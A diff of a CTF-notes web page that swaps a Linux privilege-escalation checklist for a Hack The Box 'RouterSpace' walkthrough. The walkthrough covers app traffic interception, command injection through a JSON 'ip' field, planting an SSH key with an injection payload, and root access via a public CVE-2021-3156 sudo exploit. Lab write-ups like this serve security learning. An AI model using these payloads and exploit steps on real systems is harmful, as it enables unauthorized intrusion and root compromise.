@@ -9,33 +9,35 @@
     <meta name="generator" content="Retype 2.3.0">
 
     <!-- Primary Meta Tags -->
-    <title>Linux Privesc</title>
-    <meta name="title" content="Linux Privesc">
-    <meta name="description" content="Example to create a SSH tunnel and access port 80 in 192.168.122.4" />
+    <title>Routerspace</title>
+    <meta name="title" content="Routerspace">
+    <meta name="description" content="IP: 10.10.11.148" />
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://caueb.github.io/linuxprivesc/" />
+    <link rel="canonical" href="https://caueb.github.io/writeups/htb/boxes/routerspace/" />
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://caueb.github.io/linuxprivesc/">
-    <meta property="og:title" content="Linux Privesc">
-    <meta property="og:description" content="Example to create a SSH tunnel and access port 80 in 192.168.122.4">
+    <meta property="og:url" content="https://caueb.github.io/writeups/htb/boxes/routerspace/">
+    <meta property="og:title" content="Routerspace">
+    <meta property="og:description" content="IP: 10.10.11.148">
+    <meta property="og:image" content="https://caueb.github.io/writeups/htb/boxes/routerspace/images/routerspace.png">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://caueb.github.io/linuxprivesc/">
-    <meta property="twitter:title" content="Linux Privesc">
-    <meta property="twitter:description" content="Example to create a SSH tunnel and access port 80 in 192.168.122.4">
+    <meta property="twitter:url" content="https://caueb.github.io/writeups/htb/boxes/routerspace/">
+    <meta property="twitter:title" content="Routerspace">
+    <meta property="twitter:description" content="IP: 10.10.11.148">
+    <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/boxes/routerspace/images/routerspace.png">
 
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../resources/css/retype.css?v=2.3.0.710814810087" rel="stylesheet" />
+    <link href="../../../../resources/css/retype.css?v=2.3.0.710814810087" rel="stylesheet" />
 
-    <script type="text/javascript" src="../resources/js/config.js?v=2.3.0.710814810087" data-turbo-eval="false" defer></script>
-    <script type="text/javascript" src="../resources/js/retype.js?v=2.3.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" type="text/javascript" src="../resources/js/lunr.js?v=2.3.0.710814810087" data-turbo-eval="false" defer></script>
-    <script id="prism-js" type="text/javascript" src="../resources/js/prism.js?v=2.3.0.710814810087" defer></script>
+    <script type="text/javascript" src="../../../../resources/js/config.js?v=2.3.0.710814810087" data-turbo-eval="false" defer></script>
+    <script type="text/javascript" src="../../../../resources/js/retype.js?v=2.3.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" type="text/javascript" src="../../../../resources/js/lunr.js?v=2.3.0.710814810087" data-turbo-eval="false" defer></script>
+    <script id="prism-js" type="text/javascript" src="../../../../resources/js/prism.js?v=2.3.0.710814810087" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -50,7 +52,7 @@
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="../" class="flex items-center leading-snug text-2xl">
+                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
                             <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
                         </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
                     </div>
@@ -201,148 +203,328 @@
                                 <div id="docs-sidebar-right-toggle"></div>
                 
                                 <!-- Page content  -->
-<doc-anchor-target id="linux-privesc" class="break-words">
+<doc-anchor-target id="routerspace" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#linux-privesc">#</doc-anchor-trigger>
-        <span>Linux Privesc</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#routerspace">#</doc-anchor-trigger>
+        <span>Routerspace</span>
     </h1>
 </doc-anchor-target>
-<doc-anchor-target id="os-kernel--hostname">
+<p><figure class="content-center">
+    <img src="images/routerspace.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>IP: 10.10.11.148</p>
+<doc-anchor-target id="enumeration">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#os-kernel--hostname">#</doc-anchor-trigger>
-        <span>OS, Kernel &amp; Hostname</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#enumeration">#</doc-anchor-trigger>
+        <span>Enumeration</span>
     </h2>
 </doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">cat /etc/os-release
-cat /etc/issue
-cat /proc/version
-hostname
-uname -a</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="users">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#users">#</doc-anchor-trigger>
-        <span>Users</span>
-    </h2>
+<doc-anchor-target id="nmap">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#nmap">#</doc-anchor-trigger>
+        <span>Nmap</span>
+    </h3>
 </doc-anchor-target>
+<p>We start running nmap in all ports:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">cat /etc/passwd
-id
-sudo -l
+<pre class="language-bash"><code v-pre class="language-bash">&gt; sudo nmap -p- --min-rate=1000 -T4 10.10.11.148
 
-# See user special groups and list files
-groups
-find / -group management -ls 2&gt;/dev/null</code></pre>
+Nmap scan report for routerspace.htb (10.10.11.148)
+Host is up (0.27s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="network">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#network">#</doc-anchor-trigger>
-        <span>Network</span>
-    </h2>
-</doc-anchor-target>
+<p>Then we run nmap with safe scripts on open ports:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">netstat -antup</code></pre>
+<pre class="language-bash"><code v-pre class="language-bash">&gt; sudo nmap -sC -sV -p 22,80 10.10.11.148
+
+Nmap scan report for 10.10.11.148                                                                                                                                                                                  
+Host is up (0.27s latency).
+
+PORT   STATE SERVICE VERSION                                                                                                                                                                                       
+22/tcp open  ssh     (protocol 2.0)                                                                                                                                                                                
+| fingerprint-strings:                                                                                                                                                                                             
+|   NULL:                                                                                                                                                                                                          
+|_    SSH-2.0-RouterSpace Packet Filtering V1                                                                                                                                                                      
+| ssh-hostkey:                                                                                                                                                                                                     
+|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)                                                                                                                                                     
+|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)                                                                                                                                                    
+|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)                                                                                                                                                  
+80/tcp open  http                                                                                                                                                                                                  
+| fingerprint-strings:                                                                                                                                                                                             
+|   FourOhFourRequest:                                                                                                                                                                                             
+|     HTTP/1.1 200 OK                                                                                                                                                                                              
+|     X-Powered-By: RouterSpace                                                                                                                                                                                    
+|     X-Cdn: RouterSpace-53401                                                                                                                                                                                     
+|     Content-Type: text/html; charset=utf-8                                                                                                                                                                       
+|     Content-Length: 71                                                                                                                                                                                           
+|     ETag: W/&quot;47-FipWg5hWDC81Z6WXln1z0qjL1iw&quot;                                                                                                                                                                     
+|     Date: Thu, 07 Jul 2022 06:56:05 GMT                                                                                                                                                                          
+|     Connection: close                                                                                                                                                                                            
+|     Suspicious activity detected !!! {RequestID: f n kfvL Mmj24O }                                                                                                                                               
+|   GetRequest:                                                                                                                                                                                                    
+|     HTTP/1.1 200 OK                                                                                                                                                                                              
+|     X-Powered-By: RouterSpace                                                                                                                                                                                    
+|     X-Cdn: RouterSpace-67423                                                                                                                                                                                     
+|     Accept-Ranges: bytes                                                                                                                                                                                         
+|     Cache-Control: public, max-age=0                                                                                                                                                                             
+|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT                                                                                                                                                                 
+|     ETag: W/&quot;652c-17d476c9285&quot;                                                                                                                                                                                   
+|     Content-Type: text/html; charset=UTF-8                                                                                                                                                                       
+|     Content-Length: 25900                                                                                                                                                                                        
+|     Date: Thu, 07 Jul 2022 06:55:57 GMT                                                                                                                                                                          
+|     Connection: close                                                                                                                                                                                            
+|     &lt;!doctype html&gt;
+...&lt;snip&gt;...</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="try-scanning-other-ports-using-netcat">
+<doc-anchor-target id="port-80---http">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#try-scanning-other-ports-using-netcat">#</doc-anchor-trigger>
-        <span>Try scanning other ports using netcat</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#port-80---http">#</doc-anchor-trigger>
+        <span>Port 80 - HTTP</span>
     </h3>
 </doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">dave@ubuntu:~/Desktop$ nc -nvz 192.168.122.4 1-10000 2&gt;&amp;1 | grep -v failed
-Connection to 192.168.122.4 80 port [tcp/*] succeeded!</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="ssh-tunnel">
+<p>Accessing <a href="http://10.10.11.148/">http://10.10.11.148/</a> we land on what it looks like an Android application website with the title &quot;RouterSpace&quot;:
+<figure class="content-center">
+    <img src="images/image01.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+We can download the Android app from the &quot;Download Now&quot; button.</p>
+<doc-anchor-target id="install-anbox">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#ssh-tunnel">#</doc-anchor-trigger>
-        <span>SSH tunnel</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#install-anbox">#</doc-anchor-trigger>
+        <span>Install Anbox</span>
     </h3>
 </doc-anchor-target>
-<p>Example to create a SSH tunnel and access port 80 in 192.168.122.4</p>
+<p>Next we will install Anbox using snap so we can have a look at the requests while we play with the app:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">ssh -L 80:192.168.122.4:80 dave@10.10.10.109</code></pre>
+<pre class="language-bash"><code v-pre class="language-bash">sudo apt install snapd
+systemctl enable --now snapd
+service snapd.apparmor start 
+snap install --devmode --beta anbox
+sudo snap set anbox software-rendering.enable=true
+sudo snap restart anbox.container-manager</code></pre>
 </doc-codeblock></div>
-<p>Now we can access 127.0.0.1:80.</p>
-<doc-anchor-target id="processes-running">
+<p>Start Anbox:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">/snap/bin/anbox.appmgr</code></pre>
+</doc-codeblock></div>
+<p>As the Anbox emulator starts we can look at the IP address assigned to it, we will need it later to configure Burp. We can go to Settings -&gt; About emulated device -&gt; Status:
+<figure class="content-center">
+    <img src="images/image02.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Check if we can connect to the emulator via ADB:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">&gt; adb devices
+List of devices attached
+emulator-5558   device
+
+&gt; adb shell
+
+x86_64:/ $ su root
+x86_64:/ # id
+uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc)</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="install-routerspace-application">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#install-routerspace-application">#</doc-anchor-trigger>
+        <span>Install RouterSpace application</span>
+    </h3>
+</doc-anchor-target>
+<p>Lets install the RouterSpace application in the emulator:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">&gt; adb install RouterSpace.apk        
+Performing Streamed Install
+Success</code></pre>
+</doc-codeblock></div>
+<p>Good! The application is now installed:
+<figure class="content-center">
+    <img src="images/image03.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="setup-burp-to-capture-anbox-traffic">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setup-burp-to-capture-anbox-traffic">#</doc-anchor-trigger>
+        <span>Setup Burp to capture Anbox traffic</span>
+    </h3>
+</doc-anchor-target>
+<p>Now we just need to setup Anbox to send its traffic through Burp.
+Anbox created a new interface in the <code v-pre>192.168.250.1/24</code> which is where the application will comunicate:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">&gt; ifconfig anbox0
+anbox0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.250.1  netmask 255.255.255.0  broadcast 0.0.0.0
+        inet6 fe80::c0ee:b3ff:fe2a:58e7  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether fe:75:d4:c6:20:0b  txqueuelen 1000  (Ethernet)
+        RX packets 281  bytes 16440 (16.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 92  bytes 5564 (5.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre>
+</doc-codeblock></div>
+<p>We can setup Burp proxy as follows:
+<figure class="content-center">
+    <img src="images/image04.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>And then we configure the emulator to send the traffic through that address:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">&gt; adb shell settings put global http_proxy 192.168.250.1:8080</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="intercepting-request-in-burp">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#intercepting-request-in-burp">#</doc-anchor-trigger>
+        <span>Intercepting request in Burp</span>
+    </h3>
+</doc-anchor-target>
+<p>Now we can start the RouterSpace app in the emulator.
+<figure class="content-center">
+    <img src="images/image05.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+There is only one button &quot;Check Status&quot;. When we press that button we can see in Burp that it sends a POST request to <a href="http://routerspace.htb/">http://routerspace.htb/</a>:
+<figure class="content-center">
+    <img src="images/image06.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We add this entry to our <code v-pre>/etc/hosts</code> file so the request can find the IP:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">10.10.11.148    routerspace.htb</code></pre>
+</doc-codeblock></div>
+<p>We can now use the repeater tab in Burp to resend the same request:
+<figure class="content-center">
+    <img src="images/image07.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+The server response the same value sent in the <code v-pre>ip</code>  parameter and with an <code v-pre>\n</code> indicates that it could be vulnerable to command injection.</p>
+<p>We confirm the injection appending commands to the <code v-pre>ip</code> parameter:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-json"><code v-pre class="language-json">{&quot;ip&quot;:&quot;0.0.0.0;id&quot;}</code></pre>
+</doc-codeblock></div>
+<p><figure class="content-center">
+    <img src="images/image08.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="exploitation">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#processes-running">#</doc-anchor-trigger>
-        <span>Processes Running</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#exploitation">#</doc-anchor-trigger>
+        <span>Exploitation</span>
     </h2>
 </doc-anchor-target>
+<p>We can send commands as the user <code v-pre>paul</code>, maybe we can create an SSH key and save to his <code v-pre>authorized_keys</code> file.
+Create a new SSH key:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">ps aux
-ps aux | grep root
-</code></pre>
+<pre class="language-bash"><code v-pre class="language-bash">&gt; ssh-keygen -f paul.key
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in paul.key
+Your public key has been saved in paul.key.pub</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="installed-packages">
+<p>Using the RCE vulnerability, upload the generated <code v-pre>paul.key.pub</code> key into <code v-pre>paul/.ssh/authorized_keys</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-json"><code v-pre class="language-json">{&quot;ip&quot;:&quot;0.0.0.0;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjXkf+E3MK6omlhquDZ4gJbwfYYg0GYc2t5wxK1B2MUwT9CFU27oN8XNhpN5lAxqkLN2rmPP7A6Lrl6cauFv1LIVLd9Ksjvh6V0R/2xz8LGTh+hKPn3Np+9CaLvT4UjQmziHItzU7aeY+F2NAyPT0KMDEhTdFqrYgnSQ6IF9hXPXpgWvtIyOW9YoxyJpRlZNEjaAD7XE322YbQZg9cB59tLNoPdUooBeZVtYHaJ8bUUJwrlC3DyKpVaw4pXmJ2azGX2qpBQnY3riVtRUHoqTJvoPyIBNTSfbtbWhItooRTFKQYgOmS8lOLAnkZ3bM24L489AHXinv3O2M+ba//tspzZVp2sBEZF4FsJVaWdS3EqLkMscG8XGmgrZK5WWydIWBQY5zgukNmk8W2NtexpKAKO/QPlL79P76sMTDfBB8bk97uJ4pLnYDPQ5c1wtAcHr+W0eBgjnS9KeJYSBRxhhmEReJfGGXE/y7i8j8MY0eQVPVpIgTyoBCNYwXyZmwOo0k= caue@kali' &gt; /home/paul/.ssh/authorized_keys&quot;}</code></pre>
+</doc-codeblock></div>
+<p>Now simply SSH in using the private key:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">&gt; chmod 400 paul.key
+&gt; ssh -i paul.key paul@routerspace.htb
+...&lt;snip&gt;...
+paul@routerspace:~$</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="privilege-escalation">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#installed-packages">#</doc-anchor-trigger>
-        <span>Installed Packages</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#privilege-escalation">#</doc-anchor-trigger>
+        <span>Privilege Escalation</span>
     </h2>
 </doc-anchor-target>
+<p>Enumerating the files in the system we find the source code of the web application, including a potential credentials for <code v-pre>paul</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">dpkg -l (Debian)
-rpm -qa (Fedora)</code></pre>
+<pre class="language-bash"><code v-pre class="language-bash">paul@routerspace:~$ cat /opt/www/public/routerspace/index.js
+
+var express = require(&quot;express&quot;);
+const path = require(&quot;path&quot;);
+const app = express();
+const { check, oneOf, validationResult } = require(&quot;express-validator&quot;);
+const promisify = require('util').promisify;
+
+const port = 80;
+const tokenSecret = &quot;v%XsfkyZ#2SsfY9F--ippsec.rocks--x0o^VvYSRCw$5#MKi5&quot;;
+const userAgent = &quot;RouterSpaceAgent&quot;;
+const payload = [
+  &quot;paul@routerspace.htb&quot;,
+  &quot;*******************&quot;,
+  &quot;Hyakutake-0x1&quot;,
+];</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="find-suid">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#find-suid">#</doc-anchor-trigger>
-        <span>Find SUID</span>
-    </h2>
+<p>However running <code v-pre>sudo -l</code> to check the user privileges and trying this password did not work!</p>
+<doc-anchor-target id="sudo---vulnerable">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#sudo---vulnerable">#</doc-anchor-trigger>
+        <span>Sudo - vulnerable</span>
+    </h3>
 </doc-anchor-target>
+<p>We can verify the <code v-pre>sudo</code> version:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">find / -perm -u=s -type f 2&gt;/dev/null
-find /* -user root -perm -4000 -print 2&gt;/dev/null</code></pre>
+<pre class="language-bash"><code v-pre class="language-bash">paul@routerspace:~$ sudo -V
+Sudo version 1.8.31
+Sudoers policy plugin version 1.8.31
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.31</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="world-writable-scripts-invoked-as-root">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#world-writable-scripts-invoked-as-root">#</doc-anchor-trigger>
-        <span>World writable scripts invoked as root</span>
-    </h2>
-</doc-anchor-target>
+<p>This version of <code v-pre>sudo</code> is vulnerable to the classic CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit).
+There is a <a href="https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit">POC here</a> and we can check if it is vulnerable running <code v-pre>sudoedit -s Y</code>, if it asks for a password then it is likely to be vulnerable:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">find / -writable -type d 2&gt;/dev/null
-find / -perm -222 -type d 2&gt;/dev/null
-find / -perm -o w -type d 2&gt;/dev/null</code></pre>
+<pre class="language-bash"><code v-pre class="language-bash">paul@routerspace:~$ sudoedit -s Y
+[sudo] password for paul:</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="world-executable-folder">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#world-executable-folder">#</doc-anchor-trigger>
-        <span>World executable folder</span>
-    </h2>
-</doc-anchor-target>
+<p>Looks like it is! Lets clone the repo and upload the exploit:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">find / -perm -o x -type d 2&gt;/dev/null</code></pre>
+<pre class="language-bash"><code v-pre class="language-bash">&gt; git clone https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit
+&gt; cd Sudo-1.8.31-Root-Exploit
+&gt; scp -i paul.key  Sudo-1.8.31-Root-Exploit/exploit.c paul@routerspace.htb:/tmp
+&gt; scp -i paul.key  Sudo-1.8.31-Root-Exploit/Makefile paul@routerspace.htb:/tmp
+&gt; scp -i paul.key  Sudo-1.8.31-Root-Exploit/shellcode.c paul@routerspace.htb:/tmp</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="world-writable-and-executable-folders">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#world-writable-and-executable-folders">#</doc-anchor-trigger>
-        <span>World writable and executable folders</span>
-    </h2>
-</doc-anchor-target>
+<p><em>We have to use SCP to upload the files as it seems that there is some IPTABLES rules preventing us from accessing other ports.</em></p>
+<p>Now we compile the exploit and execute:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">find / \\( -perm -o w -perm -o x \\) -type d 2&gt;/dev/null</code></pre>
+<pre class="language-bash"><code v-pre class="language-bash">paul@routerspace:/tmp$ make
+mkdir libnss_x
+cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
+cc -O3 -o exploit exploit.c
+
+paul@routerspace:/tmp$ ls
+exploit    shellcode.c    exploit.c    libnss_x    Makefile 
+
+paul@routerspace:/tmp$ ./exploit</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="find-world-writable-files-in-etc">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#find-world-writable-files-in-etc">#</doc-anchor-trigger>
-        <span>Find world-writable files in <code v-pre>/etc</code></span>
-    </h2>
-</doc-anchor-target>
+<p>And we are root!</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">find /etc -perm -2 -type f 2&gt;/dev/null
-find / -perm -2 -type f 2&gt;/dev/null</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="world-writable-directories">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#world-writable-directories">#</doc-anchor-trigger>
-        <span>World-writable directories</span>
-    </h2>
-</doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">find / -writable -type d 2&gt;/dev/null</code></pre>
+<pre class="language-none"><code v-pre class="language-none"># id
+uid=0(root) gid=0(root) groups=0(root),1001(paul)
+# cd /root
+# ls -la
+total 44
+drwx------  7 root root 4096 Feb 17 17:16 .
+drwxr-xr-x 19 root root 4096 Feb 17 18:30 ..
+lrwxrwxrwx  1 root root    9 Nov 20  2021 .bash_history -&gt; /dev/null
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwx------  2 root root 4096 Nov 25  2021 .cache
+drwx------  3 root root 4096 Nov 20  2021 .config
+drwxr-xr-x  3 root root 4096 Nov 20  2021 .local
+drwxr-xr-x  4 root root 4096 Nov 20  2021 .npm
+-rw-r--r--  1 root root  175 Nov 20  2021 .profile
+-rw-r--r--  1 root root   66 Feb  7 14:33 .selected_editor
+drwx------  2 root root 4096 Nov 20  2021 .ssh
+-r--------  1 root root   33 Jul  7 05:54 root.txt</code></pre>
 </doc-codeblock></div>
 
                                 
@@ -353,20 +535,20 @@ find / -perm -2 -type f 2&gt;/dev/null</code></pre>
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../exploitation/webshells/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/phoenix/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                                                <span class="block mt-1">Web Shells</span>
+                                                <span class="block mt-1">Phoenix</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../linuxprivesc/bigchecklf4926/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/challenges/find-the-easy-pass/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                                                <span class="block mt-1">Big Checklist</span>
+                                                <span class="block mt-1">Find The Easy Pass</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -410,6 +592,6 @@ find / -perm -2 -type f 2&gt;/dev/null</code></pre>
 
     <div id="docs-overlay-target"></div>
 
-    <script>window.__DOCS__ = { "title": "Linux Privesc", level: 1, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
+    <script>window.__DOCS__ = { "title": "Routerspace", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
 </body>
 </html>
